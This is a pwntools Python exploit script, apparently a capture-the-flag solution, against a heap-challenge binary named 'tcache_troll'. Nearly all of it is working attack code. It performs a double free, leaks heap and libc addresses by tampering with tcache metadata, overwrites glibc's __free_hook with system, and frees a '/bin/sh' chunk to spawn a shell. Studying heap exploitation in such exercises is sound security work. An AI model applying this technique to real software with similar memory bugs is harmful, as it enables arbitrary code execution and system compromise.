#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("tcache_troll")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "read" option.
# Returns 8 bytes.
def read(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(8)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request a 0x410-sized chunk and fill it with data.
chunk_A = malloc(0x88, b"double free")
binsh = malloc(0x18, "/bin/sh\x00")

# double_Free
free(chunk_A)
free(chunk_A)

chunk_B = malloc(0x88, b"leaker")

free(chunk_A)

heap = u64(read(chunk_B)) - 0x260 # heap base offset
tcache_metadata_offset = 0x10

info("Heap: " + hex(heap))

# Leak libc phase

# overwrite tcache fd
chunk_C = malloc(0x88, p64(heap + tcache_metadata_offset))
chunk_D = malloc(0x88, p64(heap + 0x260))

# # Overwrite tcache counts to 7

seven = flat(
  p8(1),
  p8(0) * 6,
  p8(7),
  p8(0) * 56,
  p64(0) * 7,
  p64(heap + 0x50)
)

chunk_E = malloc(0x88, seven)

free(chunk_A)

libc_leak = u64(read(chunk_C)[:8]) #main_arena + 96
libc.address = libc_leak - libc.sym["main_arena"] - 96

info("Libc: " + hex(libc.address))

malloc(0x88, p64(libc.sym["__free_hook"])) # overwrite tcache entries
malloc(0x18, p64(libc.sym["system"])) # overwrite free hook

free(binsh)

# =============================================================================

io.interactive()
